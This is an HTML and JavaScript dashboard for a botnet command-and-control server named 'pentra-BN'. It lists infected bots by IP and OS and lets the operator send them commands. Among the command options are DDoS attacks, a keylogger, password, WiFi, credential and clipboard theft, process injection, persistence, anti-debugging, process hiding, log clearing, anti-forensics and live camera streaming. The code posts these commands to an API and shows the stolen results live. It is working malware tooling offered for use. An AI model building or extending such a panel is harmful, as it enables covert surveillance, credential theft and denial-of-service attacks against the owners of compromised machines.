<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>pentra-BN Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body {
            background: #0f1419;
            color: #e6e6e6;
        }
        .sidebar {
            background: #1a1f2e;
            min-height: 100vh;
            border-right: 1px solid #2d3748;
        }
        .card {
            background: #1a1f2e;
            border: 1px solid #2d3748;
            border-radius: 10px;
        }
        .table {
            color: #e6e6e6;
        }
        .table-dark {
            background: #1a1f2e;
        }
        .btn-primary {
            background: #667eea;
            border: none;
        }
        .btn-danger {
            background: #e53e3e;
            border: none;
        }
        .status-online {
            color: #48bb78;
        }
        .status-offline {
            color: #e53e3e;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <div class="col-md-3 col-lg-2 sidebar p-3">
                <h4 class="text-white mb-4">üîê pentra-BN</h4>
                <div class="mb-3">
                    <small class="text-muted">Activation Key: <span id="activationKey"></span></small>
                </div>
                
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link text-white" href="#dashboard">
                            <i class="fas fa-tachometer-alt"></i> Dashboard
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link text-white" href="#bots">
                            <i class="fas fa-robot"></i> Bots
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link text-white" href="#commands">
                            <i class="fas fa-terminal"></i> Commands
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link text-white" href="#campaigns">
                            <i class="fas fa-bullseye"></i> Campaigns
                        </a>
                    </li>
                </ul>
            </div>

            <!-- Main Content -->
            <div class="col-md-9 col-lg-10 p-4">
                <!-- Stats Cards -->
                <div class="row mb-4">
                    <div class="col-md-3">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title">Total Bots</h5>
                                <h2 id="totalBots">0</h2>
            </div>
        </div>
    </div>
                    <div class="col-md-3">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title">Active Bots</h5>
                                <h2 id="activeBots">0</h2>
                            </div>
            </div>
            </div>
                    <div class="col-md-3">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title">Commands</h5>
                                <h2 id="totalCommands">0</h2>
            </div>
            </div>
        </div>
                    <div class="col-md-3">
                        <div class="card">
                            <div class="card-body">
                                <h5 class="card-title">Last Activity</h5>
                                <h6 id="lastActivity">Never</h6>
                </div>
            </div>
                    </div>
                </div>
                
                <!-- Command Center -->
                <div class="row mb-4">
                    <div class="col-md-8">
                        <div class="card">
                            <div class="card-header">
                                <h5>Command Center</h5>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-4">
                                        <label class="form-label">Target Bot</label>
                                        <select class="form-select" id="targetBot">
                                            <option value="all">All Bots</option>
                                        </select>
                </div>
                                    <div class="col-md-4">
                                        <label class="form-label">Command Type</label>
                                        <select class="form-select" id="commandType">
                                            <option value="shell">Shell Command</option>
                                <option value="ddos">DDoS Attack</option>
                                <option value="keylogger">Keylogger</option>
                                <option value="screenshot">Screenshot</option>
                                            <option value="upload">Upload File</option>
                                <option value="system_info">System Info</option>
                                <option value="custom">Custom Command</option>
                                            <option value="steal_passwords">Steal Passwords</option>
                                            <option value="steal_wifi">Steal WiFi</option>
                                            <option value="steal_credentials">Steal Credentials</option>
                                            <option value="steal_clipboard">Steal Clipboard</option>
                                            <option value="steal_networks">Steal Networks</option>
                                            <option value="anti_analysis">Anti-Analysis</option>
                                            <option value="process_injection">Process Injection</option>
                                            <option value="registry_persistence">Registry Persistence</option>
                                            <option value="service_persistence">Service Persistence</option>
                                            <option value="anti_debugging">Anti-Debugging</option>
                                            <option value="process_hiding">Process Hiding</option>
                                            <option value="network_stealth">Network Stealth</option>
                                            <option value="file_stealth">File Stealth</option>
                                            <option value="get_location">Get Location</option>
                                            <option value="get_geolocation">Get Geolocation</option>
                                            <option value="get_timezone">Get Timezone</option>
                                            <option value="get_network_details">Get Network Details</option>
                                            <option value="self_destruct">Self Destruct</option>
                                            <option value="cleanup_registry">Cleanup Registry</option>
                                            <option value="clear_logs">Clear Logs</option>
                                            <option value="secure_delete">Secure Delete</option>
                                            <option value="wipe_free_space">Wipe Free Space</option>
                                            <option value="anti_forensics">Anti-Forensics</option>
                                            <option value="remove_persistence">Remove Persistence</option>
                                            <option value="process_list">Process List</option>
                                            <option value="kill_process">Kill Process</option>
                                            <option value="file_explorer">File Explorer</option>
                                            <option value="download_file">Download File</option>
                                            <option value="remote_update">Remote Update</option>
                                            <option value="camera_capture">Camera Capture</option>
                                            <option value="camera_stream">Camera Stream</option>
                                            <option value="clipboard_monitor">Clipboard Monitor</option>
                                            <option value="clipboard_set">Clipboard Set</option>
                                            <option value="system_monitor">System Monitor</option>
                            </select>
                        </div>
                                    <div class="col-md-4">
                                        <label class="form-label">Command</label>
                                        <input type="text" class="form-control" id="commandInput" placeholder="Enter command...">
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <button class="btn btn-primary" onclick="sendCommand()">
                                        <i class="fas fa-paper-plane"></i> Send Command
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="card">
                            <div class="card-header">
                                <h5>Quick Actions</h5>
                            </div>
                            <div class="card-body">
                                <button class="btn btn-outline-primary btn-sm mb-2 w-100" onclick="quickCommand('system_info')">
                                    System Info
                                </button>
                                <button class="btn btn-outline-primary btn-sm mb-2 w-100" onclick="quickCommand('screenshot')">
                                    Screenshot
                                </button>
                                <button class="btn btn-outline-primary btn-sm mb-2 w-100" onclick="quickCommand('steal_passwords')">
                                    Steal Passwords
                                </button>
                                <button class="btn btn-outline-warning btn-sm mb-2 w-100" onclick="quickKillProcess()">
                                    Kill Process
                                </button>
                                <button class="btn btn-outline-danger btn-sm mb-2 w-100" onclick="quickCommand('self_destruct')">
                                    Self Destruct
                                </button>
                            </div>
                    </div>
                    </div>
                </div>
                
                <!-- Bots Table -->
                <div class="row mb-4">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5>Connected Bots</h5>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table table-dark">
                                        <thead>
                                            <tr>
                                                <th>Bot ID</th>
                                                <th>IP</th>
                                                <th>OS</th>
                                                <th>Status</th>
                                                <th>Last Seen</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody id="botsTable">
                                        </tbody>
                                    </table>
                </div>
                </div>
            </div>
        </div>
    </div>
    
                <!-- Results -->
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-header">
                                <h5>Command Results</h5>
                            </div>
                            <div class="card-body">
                                <div id="resultsArea">
                                    <p class="text-muted">No results yet...</p>
                                </div>
                            </div>
            </div>
            </div>
            </div>
            </div>
        </div>
    </div>
    
    <!-- Add SocketIO client script -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        let selectedBot = null;
        let activationKey = new URLSearchParams(window.location.search).get('key');
        
        // Display activation key
        document.getElementById('activationKey').textContent = activationKey;
        
        // SocketIO real-time updates
        const socket = io();

        socket.on('connect', function() {
            console.log('Connected to C2 via SocketIO');
        });

        socket.on('command_result', function(data) {
            console.log('Received command result:', data);
            // Update results table in real-time
            updateResultsTable(data);
        });

        socket.on('new_command', function(data) {
            console.log('New command received:', data);
            // Update commands table in real-time
            updateCommandsTable(data);
        });

        function updateResultsTable(data) {
            const resultsArea = document.getElementById('resultsArea');
            const resultDiv = document.createElement('div');
            resultDiv.className = 'alert alert-info';
            // Format result as pretty JSON if possible
            let formattedResult;
            try {
                formattedResult = JSON.stringify(JSON.parse(data.result), null, 2);
            } catch (e) {
                formattedResult = data.result;
            }
            resultDiv.innerHTML = `
                <strong>Bot ${data.bot_id}</strong><br>
                <strong>Command ID:</strong> ${data.command_id}<br>
                <strong>Result:</strong><br>
                <pre style="background:#222;color:#0f0;padding:10px;border-radius:8px;overflow-x:auto;">${formattedResult}</pre>
            `;
            resultsArea.appendChild(resultDiv);
        }

        function updateCommandsTable(data) {
            // Update commands table if needed
        }

        function loadStats() {
            fetch(`/api/stats?key=${activationKey}`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalBots').textContent = data.total_bots;
                    document.getElementById('activeBots').textContent = data.active_bots;
                    document.getElementById('totalCommands').textContent = data.total_commands;
                    document.getElementById('lastActivity').textContent = data.last_activity || 'Never';
                });
        }

        function loadBots() {
            fetch(`/api/bots?key=${activationKey}`)
                .then(response => response.json())
                .then(bots => {
                    const tbody = document.getElementById('botsTable');
                    tbody.innerHTML = '';
                    
                    const select = document.getElementById('targetBot');
                    select.innerHTML = '<option value="all">All Bots</option>';
                    
                    bots.forEach(bot => {
                        // Add to table
                        const row = tbody.insertRow();
                        row.innerHTML = `
                            <td>${bot.bot_id}</td>
                            <td>${bot.ip}</td>
                            <td>${bot.os_info}</td>
                            <td><span class="status-${bot.status}">${bot.status}</span></td>
                            <td>${bot.last_seen}</td>
                            <td>
                                <button class="btn btn-sm btn-primary" onclick="selectBot('${bot.bot_id}')">Select</button>
                            </td>
                        `;
                        
                        // Add to dropdown
                        const option = document.createElement('option');
                        option.value = bot.bot_id;
                        option.textContent = bot.bot_id;
                        select.appendChild(option);
                    });
                });
        }

        function selectBot(botId) {
            selectedBot = botId;
            document.getElementById('targetBot').value = botId;
        }

        function sendCommand() {
            const target = document.getElementById('targetBot').value;
            const type = document.getElementById('commandType').value;
            const command = document.getElementById('commandInput').value;
            
            const data = {
                target: target,
                type: type,
                command: command
            };
            
            fetch(`/api/commands?key=${activationKey}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Command sent:', data);
                document.getElementById('commandInput').value = '';
            });
        }

        function quickCommand(type) {
            document.getElementById('commandType').value = type;
            document.getElementById('commandInput').value = '';
            sendCommand();
        }

        function quickKillProcess() {
            const processName = prompt("Enter process name to kill (e.g., notepad.exe):");
            if (processName) {
                const target = document.getElementById('targetBot').value;
                
                const data = {
                    target: target,
                    type: 'kill_process',
                    command: processName
                };
                
                fetch(`/api/commands?key=${activationKey}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Kill Process command sent:', data);
                    document.getElementById('commandInput').value = '';
                });
            }
        }

        // Load data on page load
        loadStats();
        loadBots();
        
        // Refresh every 10 seconds
        setInterval(() => {
            loadStats();
            loadBots();
        }, 10000);
    </script>
</body>
</html>